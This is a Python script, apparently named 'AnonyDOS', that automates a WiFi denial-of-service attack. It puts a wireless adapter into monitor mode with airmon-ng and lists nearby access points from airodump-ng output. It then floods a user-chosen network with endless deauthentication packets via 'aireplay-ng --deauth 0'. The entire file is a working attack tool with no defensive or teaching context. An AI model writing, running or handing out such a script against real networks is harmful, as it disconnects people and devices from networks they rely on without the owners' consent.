  
#!/usr/bin/env python3
import re
import csv
import time
import shutil
import os
import subprocess
from datetime import datetime

print(r"""
   █████████                                             ██████████      ███████     █████████ 
  ███░░░░░███                                           ░░███░░░░███   ███░░░░░███  ███░░░░░███
 ░███    ░███  ████████    ██████  ████████   █████ ████ ░███   ░░███ ███     ░░███░███    ░░░ 
 ░███████████ ░░███░░███  ███░░███░░███░░███ ░░███ ░███  ░███    ░███░███      ░███░░█████████ 
 ░███░░░░░███  ░███ ░███ ░███ ░███ ░███ ░███  ░███ ░███  ░███    ░███░███      ░███ ░░░░░░░░███
 ░███    ░███  ░███ ░███ ░███ ░███ ░███ ░███  ░███ ░███  ░███    ███ ░░███     ███  ███    ░███       
 █████   █████ ████ █████░░██████  ████ █████ ░░███████  ██████████   ░░░███████░  ░░█████████ 
░░░░░   ░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░ ░░░░░   ░░░░░███ ░░░░░░░░░░      ░░░░░░░     ░░░░░░░░░  
                                               ███ ░███                                        
                                              ░░██████                                         
                                               ░░░░░░                                                              
                                            .-"      "-.
                                           /            \
                                          |              |
                                          |,  .-.  .-.  ,|
                                          | )(__/  \__)( |
                                          |/     /\     \|
                                          (_     ^^     _)
                                           \__|IIIIII|__/
                                            | \IIIIII/ |
                                            \          /
                                             `--------`""")

wire_networks = []

def check_essid(essid, lst):
    check = True
    if len(lst) == 0:
        return check
    for i in lst:
        if essid in i["ESSID"]:
            check = False
    return check

if not 'SUDO_UID' in os.environ.keys():
    print("Running with sudo !")
    exit()

for fname in os.listdir():
    if ".csv" in fname:
        print("")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists")
        t = datetime.now()
        shutil.move(fname, directory + "/backup/" + str(t) + "-" + fname)

wlan = re.compile("^wlan[0-9]+")
card_wifi = wlan.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if len(card_wifi) == 0:
    print("Please connect a WiFi adapter, please try again")
    exit()

print("Your Interface:")
for index, item in enumerate(card_wifi):
    print(f"{index} - {item}")
while True:
    wifi_interface_choice = input("Please select the interface attack: ")
    try:
        if card_wifi[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices available.")

your_choice = card_wifi[int(wifi_interface_choice)]
print("Connect Success !\nNow let's kill conflicting processes")
kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])
print("Putting Wifi adapter into monitored mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", your_choice])
discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"anonydosfile","--write-interval", "1","--output-format", "csv", your_choice], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)
        for file in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file:
                    with open(file) as csv_h:
                        csv_h.seek(0)
                        csv_file = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for anony in csv_file:
                            if anony["BSSID"] == "BSSID":
                                pass
                            elif anony["BSSID"] == "Station MAC":
                                break
                            elif check_essid(anony["ESSID"], wire_networks):
                                wire_networks.append(anony)

        print("Scanning. Press Ctrl+C stop and select network attack\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(wire_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\n")
while True:
    choice = input("Please select a choice from above: ")
    try:
        if wire_networks[int(choice)]:
            break
    except:
        print("Please try again.")
bssid = wire_networks[int(choice)]["BSSID"]
channel = wire_networks[int(choice)]["channel"].strip()
subprocess.run(["airmon-ng", "start", your_choice, channel])
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, card_wifi[int(wifi_interface_choice)]])


